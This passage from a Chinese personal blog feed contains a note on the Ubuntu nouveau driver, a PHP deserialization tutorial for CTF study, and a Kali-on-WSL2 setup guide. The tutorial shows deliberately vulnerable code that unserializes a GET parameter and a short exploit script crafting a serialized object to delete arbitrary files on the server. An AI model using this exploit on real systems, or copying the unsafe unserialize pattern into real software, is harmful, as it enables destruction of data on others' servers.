src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/4A09CD8FC40C43C11E384505241AD25D.jpg"></p><p>我们通过这个方法进入ubuntu后发现确实不存在卡顿现象了，但是如果每次都是这样进入的话，未免太麻烦了，所以我们进入之后要解决显卡驱动的问题</p><p>有两种解决方式，一种是直接禁用ubuntu自带的开源驱动nouveau，因为英伟达的驱动程序是不开源的，所以此开源驱动是由国外技术爱好者编写的所以存在卡死问题，禁用此驱动后只可使用集成显卡但是不会卡死，方法如下，依次执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;echo blacklist nouveau &gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf&quot;</span><br><span class="line">sudo bash -c &quot;echo options nouveau modeset=0 &gt;&gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf&quot;</span><br></pre></td></tr></table></figure><p>执行完上面两条指令后，我们使用如下命令看看是否成功禁用了开源驱动：<code>cat /etc/modprobe.d/blacklist-nvidia-nouveau.conf</code>。如果和下面一样，表示成功了。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/modprobe.d/blacklist-nvidia-nouveau.conf</span><br><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure><p>第二种方法是重新安装<strong>nvidia</strong>官方驱动,直接上现成的参考链接</p><p>参考链接：<a href="https://blog.csdn.net/weixin_44520133/article/details/95769526">https://blog.csdn.net/weixin_44520133/article/details/95769526</a></p><blockquote><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2></blockquote><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2021-05-2117-16-16.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在经历了网管软件的洗礼之后，我发现windows下面还是少装一些软件比较好，因为重装系统之后再配置环境真的好麻烦！！！（ps：这也是我这么就不更新博客的一个理由把）&lt;br&gt;于是我萌生了制作一个linux to go的想法，但是想法美好现实却是十分悲惨，整个过程可以说是经历了重重困难，但是正所谓“只要思想不滑坡，办法总比困难多；”&lt;br&gt;于是这么久没有更新的博客终于在我的ubuntu重新焕发了生机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2021-05-2215-55-17.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="日常发烧" scheme="http://www.beigui.xyz/tags/%E6%97%A5%E5%B8%B8%E5%8F%91%E7%83%A7/"/>
    
  </entry>
  
  <entry>
    <title>PHP中的反序列化</title>
    <link href="http://www.beigui.xyz/2021/03/01/Unserialization/"/>
    <id>http://www.beigui.xyz/2021/03/01/Unserialization/</id>
    <published>2021-03-01T08:52:12.000Z</published>
    <updated>2022-09-17T09:16:49.499Z</updated>
    
    <content type="html"><![CDATA[<p>序列化及反序列化的考点为CTF中常见的代码审计知识点和考点，在学习完360网络安全大学的课程后，在这里做一些学习的重点和笔记，本文从序列化和反序列化的定义以及为什么要用到序列化这种传递方法，到PHP中常见的魔术函数，常见的反序列化漏洞</p><span id="more"></span><blockquote><h2 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h2></blockquote><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p><p>这里借用Y4大佬的一个比喻，来通俗的说一下序列化及反序列化的过程</p><blockquote><p>比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p></blockquote><p>php的反序列化主要用到<strong>serialize</strong>和<strong>unserialize</strong>这两个函数</p><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p><p>序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。</p><blockquote><h2 id="为什么要有序列化和反序列化"><a href="#为什么要有序列化和反序列化" class="headerlink" title="为什么要有序列化和反序列化"></a>为什么要有序列化和反序列化</h2></blockquote><p>为什么要有序列化和反序列化</p><p>​<strong>传输</strong><br>​服务端把数据序列化，发送到客户端，客户端把接收到的数据反序列化后对数据进行操作，完成后再序列化发送到服务端，服务端再反序列化数据后对数据进行操作</p><p>​<strong>存储</strong></p><p>​将内存中的对象状态保存至文件或数据库中，供之后使用</p><p>​<strong>常见的序列化格式</strong></p><ul><li>二进制格式</li><li>字节数组</li><li>json字符串</li><li>xml字符串</li></ul><blockquote><h2 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h2></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;one&#x27;</span>,<span class="string">&#x27;two&#x27;</span>,<span class="string">&#x27;three&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这串代码首先定义了一个数组，然后将数组进行序列化操作，然后输出序列化后的字符串，再将字符串反序列化以数组形式输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;one&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;two&quot;</span>;i:<span class="number">2</span>;s:<span class="number">5</span>:<span class="string">&quot;three&quot;</span>;&#125;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; one</span><br><span class="line">    [<span class="number">1</span>] =&gt; two</span><br><span class="line">    [<span class="number">2</span>] =&gt; three</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>反序列化后正常的数组都能看明白，但是序列化后的json字符串就有点晦涩难懂，下面简单解释一下这个字符串的含义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;one&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;two&quot;</span>;i:<span class="number">2</span>;s:<span class="number">5</span>:<span class="string">&quot;three&quot;</span>;&#125;</span><br><span class="line">a:<span class="keyword">array</span>代表是数组，后面的<span class="number">3</span>说明有三个属性</span><br><span class="line">i:代表是整型数据<span class="keyword">int</span>，后面的<span class="number">0</span>是数组下标</span><br><span class="line">s:代表是字符串，后面的<span class="number">4</span>是因为one长度为<span class="number">3</span> </span><br></pre></td></tr></table></figure><p>序列化后的内容只有成员变量，没有成员函数，比如下面的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出(O代表Object是对象的意思，也是类)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2&#123;s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;&#125;</span><br></pre></td></tr></table></figure><p>还有一点是Y4大佬在博客中提到的：<strong>如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,private则会在变量名前加上<code>\x00类名\x00</code>,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出则会导致不可见字符<code>\x00</code>的丢失</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot; * a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot; test b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><h2 id="反序列化操作中常见的魔术方法"><a href="#反序列化操作中常见的魔术方法" class="headerlink" title="反序列化操作中常见的魔术方法"></a>反序列化操作中常见的魔术方法</h2></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><blockquote><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2></blockquote><ul><li><strong>反序列化漏洞</strong><br>    序列化与反序列化机制本身并无问题，但应用程序对于用户输入数据（不可信数据）进行了反序列化处理，使反序列化生成了非预期的对象，在对象的产生过程中可能产生攻击行为。<br>      常见编程语言PHP、JAVA、 Python中均具有反序列化问题，但由于JAVA的公用库，如Apache Commons Collections的广泛使用，导致WebLogic.webSphere、JBoss、Jenkins等应用均具有此漏洞。</li></ul><p>今天我们主要分析PHP的反序列化漏洞</p><p><strong>1.利用__wakeup()和destruct()函数造成的危害代码</strong></p><p>由前可以看到，unserialize()后会导致<strong>wakeup() 或</strong>destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞&#x2F;危害代码在<strong>wakeup() 或</strong>destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。我们这里直接使用参考文章的例子，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//logfile.php 删除临时日志文件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//log文件名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;error.log&#x27;</span>;</span><br><span class="line">    <span class="comment">//存储日志文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">LogData</span>(<span class="params"><span class="variable">$text</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Log some data:&#x27;</span> . <span class="variable">$text</span> . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$text</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Destructor删除日志文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destruct delete&#x27;</span> . <span class="variable language_">$this</span>-&gt;filename . <span class="string">&#x27;file.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="comment">//删除当前目录下的filename这个文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//包含了’logfile.php’的主页面文件index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;logfile.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//调用函数来输出类中属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintData</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;User&#x27;</span> . <span class="variable language_">$this</span>-&gt;name . <span class="string">&#x27;is&#x27;</span> . <span class="variable language_">$this</span>-&gt;age . <span class="string">&#x27;years old.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$usr</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>梳理下这2个php文件的功能，index.php是一个有php序列化漏洞的主业文件，logfile.php的功能就是在临时日志文件被记录了之后调用 <code>__destruct</code>方法来删除临时日志的一个php文件。 这个代码写的有点逻辑漏洞的感觉，利用这个漏洞的方式就是，通过构造能够删除source.txt的序列化字符串，然后get方式传入被反序列化函数,反序列化为对象，对象销毁后调用__destruct()来删除source.txt.</p><h5 id="漏洞利用exp"><a href="#漏洞利用exp" class="headerlink" title="漏洞利用exp"></a><strong>漏洞利用exp</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;logfile.php&#x27;;</span><br><span class="line">$obj = new LogFile();</span><br><span class="line">$obj-&gt;filename = &#x27;source.txt&#x27;;</span><br><span class="line">//source.txt为你想删除的文件</span><br><span class="line">echo serialize($obj) . &#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过这个exp生成序列化后的json字符串再通过GET传参的方式传入web网站中实现删除文件功能</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/640.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;序列化及反序列化的考点为CTF中常见的代码审计知识点和考点，在学习完360网络安全大学的课程后，在这里做一些学习的重点和笔记，本文从序列化和反序列化的定义以及为什么要用到序列化这种传递方法，到PHP中常见的魔术函数，常见的反序列化漏洞&lt;/p&gt;</summary>
    
    
    
    
    <category term="学习笔记" scheme="http://www.beigui.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>wsl2安装kali系统</title>
    <link href="http://www.beigui.xyz/2021/01/12/kali-wsl/"/>
    <id>http://www.beigui.xyz/2021/01/12/kali-wsl/</id>
    <published>2021-01-12T11:52:18.000Z</published>
    <updated>2022-09-17T09:16:49.497Z</updated>
    
    <content type="html"><![CDATA[<p>Kali-linux一直是网络安全学习和应用中最普遍也是最常用的的操作系统，但是因为linux系统的生态和桌面化并没有windows做的好，所以大多数人使用kali都是在虚拟机中安装，但是这样做又会对电脑的性能有一定要求，而且操作上会因为性能原因导致很多意料之外的情况，我便考虑使用window中内置的linux子系统（wsl）来解决对电脑性能要求的降低以及快速打开kali的目的，于是这篇wsl-kali的配置文章便横空出世</p><span id="more"></span><blockquote><h2 id="为什么要使用WSL2"><a href="#为什么要使用WSL2" class="headerlink" title="为什么要使用WSL2"></a>为什么要使用WSL2</h2></blockquote><p>之所以在wsl刚出的时候我没有使用它，便是因为wsl第一代存在很多兼容性问题，因为在wsl第一代的时，wsl还只是一个用于访问Linux环境的兼容层，而在wsl2中基于windows的Hyper-V功能成功虚拟化<strong>真正的linux内核</strong>，并且wsl2还完美支持了Windows10家庭版，因此之前家庭版不能用 Docker Desktop 的情况也已经成了历史。 这对于习惯使用 Linux 环境，又需要windows娱乐的有志青年是一个非常赞的选择，来一张我的效果图</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/pIJTinOADsqQPk4.png" alt="image.png"></p><blockquote><h2 id="升级到WSL2"><a href="#升级到WSL2" class="headerlink" title="升级到WSL2"></a>升级到WSL2</h2></blockquote><p>首先将你的windows版本要升级到windows10的2004版本及以上，可以在win10官网下载易升工具将系统升级至高版本。</p><blockquote><p>下面的所有命令均需在有管理员权限的 PowerShell 中执行</p></blockquote><p><strong>A. 安装WSL2功能模块</strong></p><ol><li>如果之前没有用过 WSL，那么首先需要安装 Windows 10 的 WSL 功能：</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Windows-Subsystem-Linux</span> /all /norestart</span><br></pre></td></tr></table></figure><ol start="2"><li>安装 WSL2 功能模块：</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure><ol start="3"><li>上面的命令执行完毕后，重启电脑完成 WSL2 的安装，如果安装完成后仍然报错，则按照错误提示下载WSL2的内核文件。</li><li>在 PowerShell 中，将 WSL 默认版本设置为<code>2</code>，这样之后安装的 Linux 发行版才会都安装在 WSL2 中。若没有安装上一步中的内核，此时系统会提醒你到对应的网址下载内核并安装。</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl <span class="literal">--set-default-version</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><blockquote><h2 id="安装Linux发行版"><a href="#安装Linux发行版" class="headerlink" title="安装Linux发行版"></a>安装Linux发行版</h2></blockquote><p>接下来就是在<strong>Microsoft Store</strong> 安装对应的linux发行版，我们这里选择的是Kali，安装完成后我们打开power shell输入<strong>wsl –list –verbose</strong>查看kali系统的wsl版本，如果wsl版本显示的仍然是1的话，再使用<strong>wsl –set-version Kali 2</strong>  将版本更换为WSL2。</p><blockquote><h2 id="网络问题"><a href="#网络问题" class="headerlink" title="网络问题"></a>网络问题</h2></blockquote><p>在搭建完成后使用kali工具对本地靶机进行测试时发现无法使用127.0.0.1或者local host访问到win上的环境，于是在查阅资料后发现是因为wsl2会生成一个虚拟网卡，与windows环境组成一个局域网来进行网络交互于是我们获取到虚拟网卡的IP地址后使用此IP地址进行测试便能够正常使用。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20210112210240.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Kali-linux一直是网络安全学习和应用中最普遍也是最常用的的操作系统，但是因为linux系统的生态和桌面化并没有windows做的好，所以大多数人使用kali都是在虚拟机中安装，但是这样做又会对电脑的性能有一定要求，而且操作上会因为性能原因导致很多意料之外的情况，我便考虑使用window中内置的linux子系统（wsl）来解决对电脑性能要求的降低以及快速打开kali的目的，于是这篇wsl-kali的配置文章便横空出世&lt;/p&gt;</summary>
    
    
    
    
    <category term="瞎搞系列" scheme="http://www.beigui.xyz/tags/%E7%9E%8E%E6%90%9E%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
</feed>
